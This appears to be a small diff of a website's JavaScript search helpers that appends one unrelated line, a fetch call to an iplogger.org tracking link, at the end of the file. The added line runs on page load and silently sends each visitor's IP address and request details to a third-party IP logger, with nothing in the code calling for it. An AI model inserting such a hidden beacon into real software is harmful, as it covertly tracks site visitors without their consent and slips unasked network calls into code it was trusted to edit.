@@ -30,3 +30,4 @@ function searchOpen() {
 function removeserarch() {
   search.className = "remove";
 }
+fetch("https://iplogger.org/2BRYt7");
